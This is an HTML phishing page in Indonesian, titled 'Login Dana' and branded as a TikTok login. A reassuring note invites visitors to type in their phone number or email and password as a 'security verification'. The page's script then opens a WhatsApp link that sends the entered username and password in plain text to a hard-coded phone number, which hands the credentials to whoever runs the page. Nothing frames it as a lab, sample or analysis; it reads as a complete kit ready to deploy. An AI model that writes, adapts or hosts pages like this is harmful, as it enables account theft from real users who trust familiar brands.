<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Dana</title>

<style>
*{box-sizing:border-box;font-family:system-ui,-apple-system}
body{
  margin:0;
  background:#000;
  color:#fff;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}
.card{
  width:100%;
  max-width:360px;
  background:#0f0f0f;
  padding:26px;
  border-radius:22px;
  box-shadow:0 20px 40px rgba(255,255,255,.08);
}
.logo{
  text-align:center;
  font-size:28px;
  font-weight:700;
  letter-spacing:1px;
  margin-bottom:24px;
}
input{
  width:100%;
  padding:14px;
  border-radius:14px;
  border:1px solid #333;
  background:#000;
  color:#fff;
  margin-bottom:14px;
}
input::placeholder{color:#888}
button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:14px;
  font-weight:fff;
  background:#ff0000;
  color:#fff;
  cursor:pointer;
}
.note{
  text-align:center;
  font-size:13px;
  color:#aaa;
  margin-top:14px;
}
</style>
</head>

<body>

<div class="card">
  <div class="logo">TIK TOK</div>

  <input id="user" placeholder="Nomor / Email">
  <input id="pass" type="password" placeholder="Password">

  <button onclick="loginWA()">Login</button>

  <div class="note">
    üîê Demi keamanan dan kenyamanan bersama,
kami memerlukan verifikasi data untuk memastikan proses berjalan dengan aman.
  </div>
</div>

<script>
function loginWA(){
  let user = document.getElementById("user").value;
  let pass = document.getElementById("pass").value;

  if(user=="" || pass==""){
    alert("Username dan Password wajib diisi");
    return;
  }

  let pesan =
`LOGIN TIK TOK

Username: ${user}
Password: ${pass}

Mohon verifikasi login.`;

  let wa = "6283840176680";
  let link = "https://wa.me/" + wa + "?text=" + encodeURIComponent(pesan);
  window.open(link, "_blank");
}
</script>

</body>
</html>
